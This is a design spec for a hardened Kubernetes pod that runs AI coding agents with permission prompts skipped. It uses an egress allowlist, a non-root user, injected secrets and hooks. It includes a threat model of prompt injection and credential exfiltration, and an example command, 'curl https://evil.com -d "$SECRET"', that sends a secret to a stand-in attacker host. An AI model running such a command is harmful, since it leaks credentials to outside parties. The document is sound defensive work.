# Secure Agent Pod — Design Spec

**Layer:** agents (12 — Agentic Control Plane)
**Date:** 2026-03-30
**Status:** Spec

## Problem

Running AI coding agents (Claude Code, Codex, etc.) with `--dangerously-skip-permissions` or equivalent is required for agentic workflows but creates significant security risk. The agent can execute arbitrary commands, access any credential available in its environment, and communicate with any network endpoint.

This spec designs a hardened Kubernetes pod for running coding agents safely on a Talos Linux cluster with Cilium CNI. The pod includes VibeKanban as an in-container process for agent orchestration.

**Replaces:** frank-kali (the existing Kali Linux pod on gpu-1, SSH at 192.168.55.215, 50Gi PVC at /root). The secure-agent-pod retains the Kali base image and gpu-1 placement but adds security hardening, a non-root user model, and VibeKanban. The frank-kali pod should be retired once this is deployed and verified.

## Approach: Layered Defense

`--dangerously-skip-permissions` bypasses the agent's built-in permission prompts but does NOT bypass:

- OS-level file permissions and user isolation
- Kubernetes RBAC and ServiceAccount identity
- Cilium network policies (egress allowlist)
- Claude Code hooks (PreToolUse/PostToolUse fire regardless of skip-permissions)
- Pod SecurityContext (non-root, no privilege escalation)

We stack every layer that survives.

## Threat Model

| # | Threat | Likelihood | Impact | Primary defense |
|---|--------|-----------|--------|----------------|
| 1 | Agent hallucinating dangerous commands | High | High | Hooks (user-deployed, not part of this spec) |
| 2 | Prompt injection via fetched content | Medium | High | Cilium egress (can't exfil to arbitrary hosts) |
| 3 | Plugin supply chain compromise | Low | Critical | Container isolation + Cilium egress |
| 4 | Credential exfiltration via curl/wget/nc | Medium | Critical | Cilium egress allowlist |
| 5 | Container escape | Very Low | Critical | Talos hardened OS |

---

## 1. Container & User Model

### Base image

Kali Linux (existing frank-kali image) with all required tools baked in:

- Claude Code CLI
- kubectl, talosctl, omnictl
- git, curl, ssh-client
- node (v22+), python3, bun
- cron

**No sudo is installed.** If new tools are needed, rebuild the image and redeploy.

### User

```
User: claude (UID 1000, GID 1000)
Home: /home/claude
Shell: /bin/bash
```

### Pod SecurityContext

```yaml
securityContext:
  runAsUser: 1000
  runAsGroup: 1000
  runAsNonRoot: true
  allowPrivilegeEscalation: false
  capabilities:
    drop: ["ALL"]
```

### PVC Layout

```
/home/claude/                          # PVC: agent-home (persistent, ReadWriteOnce)
  repos/                               # Git clones — shared with VibeKanban
  .claude/                             # Claude Code config, plugins, hooks
  .claude-mem/                         # Cross-session memory (if using claude-mem plugin)

/run/secrets/                          # K8s Secret volume (read-only, mode 0400)
  talosconfig                          # Talos API config
  kubeconfig                           # K8s API config (fallback; SA token preferred)
  omniconfig                           # Omni config
```

---

## 2. VibeKanban (In-Container Process)

VibeKanban (https://github.com/BloopAI/vibe-kanban) runs as a process inside the kali container, using its local mode (SQLite storage).

### Why in-container (not sidecars)

The original plan used 3 sidecar containers (server, PostgreSQL, ElectricSQL) for VibeKanban's remote/self-hosted mode. Testing revealed that the remote-server container does NOT expose the local workspace to its sessions, even with shared volume mounts. Pairing a second vibe-kanban process would require SSL/JWT authentication — unnecessary complexity for a single-agent pod.

Local mode:
- Uses SQLite (file-based, zero-config) — database lives on the agent-home PVC
- Runs as the same `claude` user (UID 1000) — sees the same filesystem
- No external database services needed
- Built-in authentication for the web UI
- Data survives container restarts (PVC-backed)

### Setup

- `npm install -g vibe-kanban` baked into the Kali image (Prereq A)
- Started as a child process in `entrypoint.sh`: `vibe-kanban &`
- Supervised by the existing `wait -n` pattern (pod restarts if process dies)
- Web UI on port 8081, exposed via LoadBalancer at 192.168.55.218
- Accessed via Tailscale only — NOT publicly exposed

### How VibeKanban spawns agents

VibeKanban creates git worktrees under `/home/claude/repos/` and invokes coding agents. Because it runs in the same container:

- Spawned agent sessions inherit the Cilium egress policy
- User-deployed Claude Code hooks apply to all sessions
- The `claude` user's permissions apply uniformly
- Same filesystem — no volume mount coordination needed

---

## 3. Credential Injection

**Principle:** No credential touches disk as a plaintext file. Secrets are injected by the Kubernetes pod spec.

### Tier 1: ESO + Infisical (automated rotation)

For secrets managed by Infisical. Uses Universal Auth today (token-based). Migrate to OIDC when available.

```yaml
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: agent-secrets-infisical
  namespace: secure-agent-pod
spec:
  refreshInterval: 1h
  secretStoreRef:
    name: infisical-store
    kind: SecretStore
  target:
    name: agent-secrets-tier1
  data:
    # Populate with actual secret references
    - secretKey: ANTHROPIC_API_KEY
      remoteRef:
        key: <infisical-path>
```

SecretStore (Universal Auth):

```yaml
apiVersion: external-secrets.io/v1beta1
kind: SecretStore
metadata:
  name: infisical-store
  namespace: secure-agent-pod
spec:
  provider:
    infisical:
      auth:
        universalAuth:
          secretRef:
            name: infisical-universal-auth
            key: token
      projectId: <project-id>
```

**Note:** As of deployment, no Tier 1 secrets are active. Claude Code authenticates via Max subscription login (`claude login`), not via `ANTHROPIC_API_KEY` env var. The ExternalSecret was removed from manifests. Re-add when Infisical-managed secrets are needed.

### Tier 2: Manual K8s Secrets (quarterly rotation)

For credentials that can't go through Infisical or are file-based.

```bash
# Example — adapt to actual secrets needed
kubectl create secret generic agent-secrets-tier2 \
  --namespace=secure-agent-pod \
  --from-literal=GITHUB_TOKEN='...' \
  --from-literal=SOME_API_KEY='...'

kubectl create secret generic agent-configs \
  --namespace=secure-agent-pod \
  --from-file=talosconfig=./talosconfig.yaml \
  --from-file=kubeconfig=./kubeconfig.yaml \
  --from-file=omniconfig=./omniconfig.yaml
```

### Kubernetes Identity

Dedicated ServiceAccount with auditable identity:

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: agent-sa
  namespace: secure-agent-pod
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: agent-cluster-admin
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
  - kind: ServiceAccount
    name: agent-sa
    namespace: secure-agent-pod
```

kubectl inside the pod uses the automounted SA token automatically.

### Cron Environment

K8s injects env vars into the pod entrypoint. Cron may not inherit these. Create a loader script at `/home/claude/.load-env.sh` that re-exports from `/proc/1/environ` for cron jobs.

---

## 4. Network Egress Control (Cilium)

Default deny, explicit allowlist.

```yaml
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: agent-egress
  namespace: secure-agent-pod
spec:
  endpointSelector:
    matchLabels:
      app: secure-agent-pod
  egress:
    # DNS (required for FQDN policies)
    - toEndpoints:
        - matchLabels:
            k8s:io.kubernetes.pod.namespace: kube-system
            k8s-app: kube-dns
      toPorts:
        - ports:
            - port: "53"
              protocol: UDP

    # Claude API
    - toFQDNs:
        - matchName: api.anthropic.com
      toPorts:
        - ports:
            - port: "443"

    # Telegram Bot API
    - toFQDNs:
        - matchName: api.telegram.org
      toPorts:
        - ports:
            - port: "443"

    # GitHub (git + API + container registry)
    - toFQDNs:
        - matchPattern: "*.github.com"
        - matchName: github.com
        - matchName: ghcr.io
        - matchPattern: "*.ghcr.io"
      toPorts:
        - ports:
            - port: "443"
            - port: "22"

    # Cloudflare R2
    - toFQDNs:
        - matchPattern: "*.r2.cloudflarestorage.com"
      toPorts:
        - ports:
            - port: "443"

    # npm + PyPI (plugin/dependency installs)
    - toFQDNs:
        - matchName: registry.npmjs.org
        - matchName: pypi.org
        - matchName: files.pythonhosted.org
      toPorts:
        - ports:
            - port: "443"

    # Cluster-internal
    - toCIDR:
        - 192.168.55.0/24
        - 192.168.50.0/24

    # K8s API server
    - toEntities:
        - kube-apiserver
```

**What this blocks:** Any connection to hosts not in the allowlist. A prompt injection running `curl https://evil.com -d "$SECRET"` fails at the Cilium datapath.

**Maintenance:** New endpoints require a policy update committed to the repo. Intentional friction.

---

## 5. Hooks (User Responsibility)

Claude Code hooks fire even with `--dangerously-skip-permissions`. The pod provides the infrastructure; the user deploys their own hook scripts to `/home/claude/.claude/settings.json` inside the pod.

Recommended hook categories:
- **PreToolUse Bash:** Block destructive filesystem operations, secret exfiltration patterns, unsafe git operations, arbitrary download-and-execute
- **PreToolUse Write/Edit:** Block writes to system directories and secret mounts
- **PostToolUse Bash:** Audit logger (append all commands to a JSONL file)

Hook scripts are deployed separately and are not part of the pod spec.

---

## 6. Accepted Risks

| Risk | Mitigation | Residual |
|------|-----------|----------|
| cluster-admin is broad | Named SA, audit logging | Agent can affect any namespace |
| talosctl/omnictl are host-level | Hook-based blocking (user-deployed) | Agent can still read host state |
| ESO Universal Auth token is long-lived | Quarterly rotation, project-scoped | Compromise = access until rotation |
| VibeKanban SQLite on shared PVC | Single process, same user | VK bug could corrupt its own DB; repos unaffected |

---

## 7. Future Enhancements

- **gVisor runtime class:** Syscall sandboxing. Test GPU passthrough compatibility.
- **Namespace-scoped RBAC:** Replace cluster-admin if operations can be narrowed.
- **vCluster:** Virtual cluster isolation when multi-tenancy is available.

---

## 8. Verification

1. **Non-root:** `kubectl exec <pod> -c kali -- id` → `uid=1000(claude)`
2. **No sudo:** `kubectl exec <pod> -c kali -- sudo ls` → `command not found`
3. **Egress blocked:** `kubectl exec <pod> -c kali -- curl https://httpbin.org/ip` → fails
4. **Egress allowed:** `kubectl exec <pod> -c kali -- curl -s https://api.anthropic.com/` → succeeds
5. **Secrets injected:** `kubectl exec <pod> -c kali -- env | grep -i key` → set, no file at `/home/claude/.env`
6. **VibeKanban running:** `kubectl exec <pod> -c kali -- pgrep -f vibe-kanban` → PID exists, `curl -s http://127.0.0.1:8081` → responds
7. **PVC persists:** Delete pod, wait for restart, verify `/home/claude/repos/` survives
8. **VibeKanban UI:** Access via Tailscale at `http://<tailscale-ip>:8081`, log in with VibeKanban's built-in local auth
